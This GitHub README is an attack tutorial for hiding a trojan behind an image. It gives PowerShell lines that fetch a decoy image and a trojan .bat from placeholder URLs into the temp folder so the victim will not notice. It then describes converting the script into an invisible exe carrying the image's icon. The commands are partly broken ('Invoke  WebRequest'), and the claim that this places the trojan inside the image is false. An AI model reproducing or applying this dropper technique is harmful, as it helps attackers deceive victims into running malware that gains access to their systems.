<h1 align="center">Welcome to Repositorie of how to add Trojan in backdoor👋</h1>
<p>
<img src="https://img.shields.io/badge/version-0.1-blue.svg?cacheSeconds=2592000" />
</p>

[![Bat-To-Exe](https://raw.githubusercontent.com/AnandKatariya/Kali-Linux-Jupyter-Notebook-Installation/a9eea7518be7dadfdc60ac934d98e59735590209/Image/made-with-kali-linux.svg)](https://www.python.org/)


### 🏠 [Homepage](https://github.com/AnandKatariya?tab=repositories)

<p align =center >
  <img src="https://media.tenor.com/-r6mKisZ_ycAAAAM/tokusatsu-ultraman.gif" height='288' width='512' />
</p>

<h2 align="center"> Dont try this at Home, School,Or any other public place!!! </h2>
<br>

<h1 align="center"> Introduction to Trojan</h1>

<p>
A Trojan Horse Virus is a type of malware that downloads onto a computer disguised as a legitimate program. The delivery method typically sees an attacker use social engineering to hide malicious code within legitimate software to try and gain users' system access with their software.
  <P/>

  <h2> If you don't know how to make trojan you need to see my previous repository in that I have explain fully how to make trojan then after that you need to use this repository to add trojan at backdoor. </h2>

### 🏠 [How to make trojan ](https://github.com/AnandKatariya/Create-Trojan)

## But all apart in this we will learn how to add trojan in backdoor from powershell.

<h2>Go to browser and select the image which you want to send to target.</h2><br>
<h2>Then open powershell and direct the powershell to desktop.</h2><br>

## Direct to desktop 
```sh
cd .\Desktop\
```

Then after this it will be redirected to desktop and after that paste the command but before pasting just edit website.com to ehich image you want to send to target paste that URL.

## Downlode you image
```sh
Invoke  WebRequest 'https://website.com/file.exe' -OutFile file.exe 
trojan.png
```
Paste this into your powershell and you will able to downlode the image you can see it on desktop, But if you need to add trojan into backdoor you need to add som new command to codeline.

<h2> If you have trojan file add it but if you dont have you need to create it, If you dont know to to create it just check my last repo.. and you will learn. After creating the trojan you need to save it as .bat file.  </h2>
<br>
<h3> Now here we will place the trojan file inside the image so we need to add the command in powershell is,</h3>
  
  ## Add trojan in image
```sh
Invoke  WebRequest 'https://website.com/file.exe' -OutFile file.exe 
trojan.png
Invoke  WebRequest 'www.Your_trojan_file.bat' -OutFile Virus.bat
virus.bat
```
<br>
<h3> But this is not the way if you will downlode the virus file on desktop user will know this so we need to go to temp directory. So </h3>

 # To add file in temp
```sh
cd %temp%
Invoke  WebRequest 'https://website.com/file.exe' -OutFile file.exe 
trojan.png
Invoke  WebRequest 'www.Your_trojan_file.bat' -OutFile Virus.bat
virus.bat
```

after this you need to save this and and you need to save this in all file not in text document and after that save as extension as matrix-trojan.bat
you need to save it as .bat it is mandatory. But you will see that file not looking properly it looking like any suspious file so we need to modify it. So we all need to do is 

## Downlode bat to exe converter

[![Bat-To-Exe](https://raw.githubusercontent.com/AnandKatariya/Backdoor-Trojan/16545e42c093f37c828f551632a0067c4cdfce69/logo/bat-to-exe-file.svg)](https://github.com/AnandKatariya/Backdoor-Trojan/blob/main/Bat_To_Exe_Converter_x64.exe)


<h2> After install open the file or drag and drop it in the Bat to Exe converter and run the file then select the icon as the thumnail of the same image but before select the icon go to png to ico converter online and convert the image in ico file and then add it as logo and change the exe format into invisible after this you will convert it and thats it your are done.</h2>

## Author

👤 **Anand Katariya**

* Github: [@AnandKatariya](https://github.com/AnandKatariya)

## 🤝 Contributing

Contributions, issues and feature requests are welcome!<br />Feel free to check [issues page](https://github.com/AnandKatariya/Backdoor-Trojan/issues).

